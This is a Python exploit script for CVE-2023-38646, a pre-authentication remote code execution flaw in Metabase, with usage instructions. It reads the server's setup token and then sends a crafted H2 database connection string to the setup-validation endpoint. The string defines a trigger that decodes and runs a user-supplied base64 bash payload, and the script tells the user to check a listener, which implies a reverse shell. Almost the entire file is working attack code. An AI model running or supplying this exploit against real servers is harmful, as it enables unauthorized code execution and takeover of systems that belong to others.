#!/usr/bin/env python3
#
# CVE-2023-38646.py - Pre-Auth RCE via SQL Injection 
# Made with love by Red4mber
# Usage: CVE-2023-38646.py [-x base64_encoded_payload] metabase_url
#
# Big thanks to these guys for their awesome writeup
# https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
#
# To quickly spin up a test environment (don't forget to set it up): 
# docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.46.6

import argparse
import urllib.parse
import requests

def get_token(url):
    try:
        data = requests.get(urllib.parse.urljoin(url, "/api/session/properties")).json()
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)
    except ValueError:
        raise SystemExit("Wrong url, failed to decode json")
    if "setup-token" not in data:
        raise SystemExit("Setup token not found, target is likely not vulnerable")

    print("Target is vulnerable !")
    token = data["setup-token"]
    print("Setup token: "+token)
    return token

def exploit(url, token, payload):
    req_json = {
        "token": token,
        "details": {
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER eheheh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,"+payload+"}|{base64,-d}|{bash,-i}')\n$$--=x"
            },
            "engine": "h2"
        } 
    }
    api_endpoint = urllib.parse.urljoin(url, "/api/setup/validate")
    res = requests.post(api_endpoint, json=req_json)
    print("Payload sent ! Check your listener :3")
    return

def main():
    parser = argparse.ArgumentParser(prog='CVE-2023-38646.py',
                    description='Metabase Pre-Auth RCE Exploit',
                    epilog='Text at the bottom of help')
    parser.add_argument("url", help="url of the metabase instance")
    parser.add_argument("-x", metavar="BASE64 PAYLOAD", help="Exploits the target", required=False)
    args = parser.parse_args()


    token = get_token(args.url)
    if args.x is not None:
        exploit(args.url, token, args.x)    

if __name__ == "__main__":
    sys.exit(main())
